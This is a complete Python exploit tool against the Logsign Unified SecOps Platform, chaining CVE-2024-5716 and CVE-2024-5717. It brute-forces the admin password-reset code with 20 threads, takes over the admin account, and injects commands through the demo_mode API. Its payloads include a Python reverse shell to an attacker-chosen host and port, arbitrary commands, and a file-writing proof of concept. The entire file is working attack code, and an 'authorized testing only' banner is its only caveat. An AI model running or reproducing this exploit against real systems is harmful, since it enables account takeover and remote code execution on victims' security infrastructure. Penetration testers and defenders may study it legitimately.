#!/usr/bin/env python3
"""
Logsign Unified SecOps Platform RCE Exploit
CVE-2024-5716 (Authentication Bypass) + CVE-2024-5717 (Command Injection)

FOR AUTHORIZED SECURITY TESTING ONLY
"""

import os
import sys
import json
import requests
import threading
import time
import random
import string
import signal
import argparse
import logging # DEBUG İÇİN EKLENDİ
from urllib.parse import urlparse
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Global variables
SUCCESS_RESET_CODE = None
TARGET_VERIFICATION_CODE = None
LIST_VERIFY_TIMES = None
NEED_EXIT = False
REQUEST_COOKIE = None

class LogsignExploit:
    def __init__(self, target_url):
        parsed_url = urlparse(target_url)
        self.protocol = parsed_url.scheme or "https"
        self.remote_ip = parsed_url.netloc or parsed_url.path
        self.base_url = f"{self.protocol}://{self.remote_ip}"
        
        # Remove port from IP if it exists for display
        self.display_ip = self.remote_ip.split(':')[0]
        
        logging.info(f"Target: {self.base_url}")
    
    def send_forget_password_request(self, username):
        """Send password reset request"""
        url = f"{self.base_url}/api/settings/forgot_password"
        data = {"username": username}
        logging.debug(f"Sending 'forget password' request to {url} with data: {data}")
        
        try:
            response = requests.post(url, json=data, verify=False, timeout=10)
            content = json.loads(response.content)
            logging.debug(f"'Forget password' response: {content}")
            return content
        except Exception as e:
            logging.error(f"Error in forget password request: {e}")
            return None
    
    def send_verify_password_request(self, username, reset_code):
        """Verify reset code"""
        url = f"{self.base_url}/api/settings/verify_reset_code"
        data = {
            "username": username,
            "reset_code": reset_code
        }
        logging.debug(f"Trying reset_code: {reset_code}")
        
        try:
            response = requests.post(url, json=data, verify=False, timeout=10)
            content = json.loads(response.content)
            logging.debug(f"Verify response for code {reset_code}: {content}")
            return content
        except Exception as e:
            # Hata durumunda loglama, programın çökmemesi için devam ediyor
            logging.debug(f"Error verifying code {reset_code}: {e}")
            return {"message": "Error", "success": False}
    
    def send_reset_password_request(self, username, verification_code, password):
        """Reset user password"""
        url = f"{self.base_url}/api/settings/reset_user_password"
        data = {
            "username": username,
            "verification_code": verification_code,
            "password": password
        }
        logging.debug(f"Sending 'reset password' request to {url}")
        
        try:
            response = requests.post(url, json=data, verify=False, timeout=10)
            content = json.loads(response.content)
            logging.debug(f"'Reset password' response: {content}")
            return content
        except Exception as e:
            logging.error(f"Error in reset password request: {e}")
            return None
    
    def try_reset_code(self, username, index, start_code, end_code):
        """Thread function to brute force reset codes"""
        global SUCCESS_RESET_CODE, TARGET_VERIFICATION_CODE, LIST_VERIFY_TIMES, NEED_EXIT
        
        logging.debug(f"Thread-{index} starting to brute force from {start_code} to {end_code}")
        total_try_times = 0
        for i in range(start_code, end_code, 1):
            total_try_times += 1
            if NEED_EXIT or SUCCESS_RESET_CODE is not None:
                logging.debug(f"Thread-{index} exiting because a code was found or exit signal received.")
                break
                
            reset_code = str(i).rjust(6, "0")
            verify_result = self.send_verify_password_request(username, reset_code)
            
            if verify_result and verify_result.get('message', '').find('Success') != -1:
                logging.info(f"Success! Reset code found: {reset_code}")
                SUCCESS_RESET_CODE = reset_code
                TARGET_VERIFICATION_CODE = verify_result['verification_code']
                logging.info(f"Verification code: {TARGET_VERIFICATION_CODE}")
                break
            elif verify_result and verify_result.get('message', '').find('timeout') != -1:
                logging.warning(f"Timeout received on Thread-{index}. Stopping this thread's attempts.")
                break
        
        LIST_VERIFY_TIMES[index] = total_try_times
        logging.debug(f"Thread-{index} finished. Total attempts for this thread: {total_try_times}")
    
    def reset_password_main(self, username, password):
        """Main password reset function using CVE-2024-5716"""
        global LIST_VERIFY_TIMES, SUCCESS_RESET_CODE, TARGET_VERIFICATION_CODE
        
        logging.info(f"Starting authentication bypass attack on user: {username}")
        logging.info(f"New password will be: {password}")
        
        thread_number = 20
        total_count = 1000000
        number_interval = total_count // thread_number
        loop_time = 0
        
        while True:
            logging.info(f"Attempt #{loop_time + 1}")
            
            # Reset global variables for new attempt
            SUCCESS_RESET_CODE = None
            TARGET_VERIFICATION_CODE = None
            
            # Send forget password request
            forget_result = self.send_forget_password_request(username)
            if not forget_result:
                logging.error("Failed to send forget password request")
                return False
            
            loop_time += 1
            LIST_VERIFY_TIMES = [None] * thread_number
            threads = []
            
            # Create threads for brute forcing
            logging.debug(f"Creating {thread_number} threads for brute force...")
            for i in range(thread_number):
                start = i * number_interval
                end = (i + 1) * number_interval
                if i == (thread_number - 1):
                    end = total_count
                
                thread = threading.Thread(
                    target=self.try_reset_code,
                    args=(username, i, start, end)
                )
                threads.append(thread)
            
            # Start all threads
            for thread in threads:
                thread.start()
            
            # Wait for all threads to complete
            for thread in threads:
                thread.join()
            
            if SUCCESS_RESET_CODE is None:
                total_try_times = sum(filter(None, LIST_VERIFY_TIMES))
                logging.warning(f"Timeout. Total attempts in this round: {total_try_times}. Retrying...")
                continue
            
            logging.info(f"Success! Reset code: {SUCCESS_RESET_CODE}")
            logging.info(f"Verification code: {TARGET_VERIFICATION_CODE}")
            
            # Reset the password
            reset_result = self.send_reset_password_request(
                username, TARGET_VERIFICATION_CODE, password
            )
            logging.info(f"Password reset result: {reset_result}")
            return True
            
        return False
    
    def send_login_request(self, username, password):
        """Login with credentials"""
        url = f"{self.base_url}/api/login"
        data = {
            "username": username,
            "password": password
        }
        logging.debug(f"Attempting to log in as user '{username}'")
        
        try:
            response = requests.post(url, json=data, verify=False, timeout=10)
            logging.debug(f"Login response headers: {response.headers}")
            return response.headers
        except Exception as e:
            logging.error(f"Login failed: {e}")
            return None
    
    def reset_demo_mode(self):
        """Reset demo mode"""
        global REQUEST_COOKIE
        logging.debug("Resetting demo mode before sending payload...")
        url = f"{self.base_url}/api/settings/demo_mode"
        data = {"enable": False}
        headers = {"Cookie": REQUEST_COOKIE}
        
        try:
            requests.post(url, json=data, headers=headers, verify=False, timeout=10)
        except:
            pass
    
    def send_demo_mode_payload(self, payload):
        """Send command injection payload using CVE-2024-5717"""
        global REQUEST_COOKIE
        
        url = f"{self.base_url}/api/settings/demo_mode"
        data = {
            "enable": True,
            "list": payload
        }
        headers = {"Cookie": REQUEST_COOKIE}
        logging.debug(f"Sending RCE payload to {url} with data: {data}")
        
        try:
            response = requests.post(url, json=data, headers=headers, verify=False, timeout=10)
            content = json.loads(response.content)
            logging.debug(f"RCE payload response: {content}")
            return content
        except Exception as e:
            logging.error(f"Error sending payload: {e}")
            return None
    
    def exploit(self, reverse_ip=None, reverse_port=None, command=None):
        """Main exploit function"""
        global REQUEST_COOKIE
        
        username = "admin"
        new_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))
        
        logging.info("Starting Logsign RCE exploit")
        logging.info(f"Target: {self.base_url}")
        
        # Step 1: Reset admin password (CVE-2024-5716)
        logging.info("\n[*] Step 1: Exploiting authentication bypass (CVE-2024-5716)")
        if not self.reset_password_main(username, new_password):
            logging.error("Failed to reset password")
            return False
        
        # Step 2: Login with new credentials
        logging.info("\n[*] Step 2: Logging in with new credentials")
        login_result = self.send_login_request(username, new_password)
        if not login_result or 'Set-Cookie' not in login_result:
            logging.error("Login failed. Could not retrieve session cookie.")
            return False
        
        REQUEST_COOKIE = login_result['Set-Cookie']
        logging.info("Successfully logged in and obtained session cookie.")
        logging.debug(f"Cookie: {REQUEST_COOKIE}")
        
        # Step 3: Execute command injection (CVE-2024-5717)
        logging.info("\n[*] Step 3: Exploiting command injection (CVE-2024-5717)")
        
        if command:
            # Execute custom command
            payload = f"`{command}`"
            logging.info(f"Executing command: {command}")
        elif reverse_ip and reverse_port:
            # Create reverse shell
            payload = f'`python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"{reverse_ip}\\",{reverse_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"])"`'
            logging.info(f"Creating reverse shell to {reverse_ip}:{reverse_port}")
        else:
            # Default proof of concept
            payload = "`id > /tmp/logsign_pwned.txt`"
            logging.info("Executing proof of concept command: 'id > /tmp/logsign_pwned.txt'")
        
        self.reset_demo_mode()
        result = self.send_demo_mode_payload(payload)
        
        if result:
            logging.info(f"Payload sent successfully: {result}")
            if command:
                logging.info("Custom command executed. Check your output.")
            elif reverse_ip:
                logging.info(f"Reverse shell payload sent to {reverse_ip}:{reverse_port}. Check your listener.")
            else:
                logging.info("Check /tmp/logsign_pwned.txt on the target for proof.")
            return True
        else:
            logging.error("Failed to send payload.")
            return False

def signal_handler(sig, frame):
    """Handle Ctrl+C"""
    global NEED_EXIT
    NEED_EXIT = True
    logging.warning("\n[!] Received exit signal! Shutting down threads...")
    sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Logsign RCE Exploit Tool")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., https://example.com:8443)")
    parser.add_argument("-rh", "--reverse-host", help="Reverse shell IP address")
    parser.add_argument("-rp", "--reverse-port", type=int, help="Reverse shell port")
    parser.add_argument("-c", "--command", help="Custom command to execute")
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug logging") # DEBUG İÇİN EKLENDİ
    
    args = parser.parse_args()
    
    # DEBUG İÇİN LOGLAMA AYARLARI EKLENDİ
    log_level = logging.DEBUG if args.debug else logging.INFO
    logging.basicConfig(level=log_level, format='%(asctime)s - %(levelname)s - %(message)s')

    # Set up signal handler
    signal.signal(signal.SIGINT, signal_handler)
    
    # Create exploit instance
    exploit = LogsignExploit(args.target)
    
    # Validate arguments
    if args.reverse_host and not args.reverse_port:
        logging.error("Error: --reverse-port required when using --reverse-host")
        sys.exit(1)
    
    if args.reverse_port and not args.reverse_host:
        logging.error("Error: --reverse-host required when using --reverse-port")
        sys.exit(1)
    
    # Run exploit
    print("="*60)
    print("Logsign Unified SecOps Platform RCE Exploit")
    print("CVE-2024-5716 + CVE-2024-5717")
    print("FOR AUTHORIZED SECURITY TESTING ONLY")
    print("="*60)
    
    try:
        success = exploit.exploit(
            reverse_ip=args.reverse_host,
            reverse_port=args.reverse_port,
            command=args.command
        )
        
        if success:
            logging.info("\n[+] Exploit completed successfully!")
        else:
            logging.error("\n[-] Exploit failed!")
            sys.exit(1)
            
    except KeyboardInterrupt:
        logging.warning("\n[!] Exploit interrupted by user")
        sys.exit(1)
    except Exception as e:
        logging.error(f"\n[-] Exploit failed with error: {e}", exc_info=args.debug)
        sys.exit(1)

if __name__ == "__main__":
    main()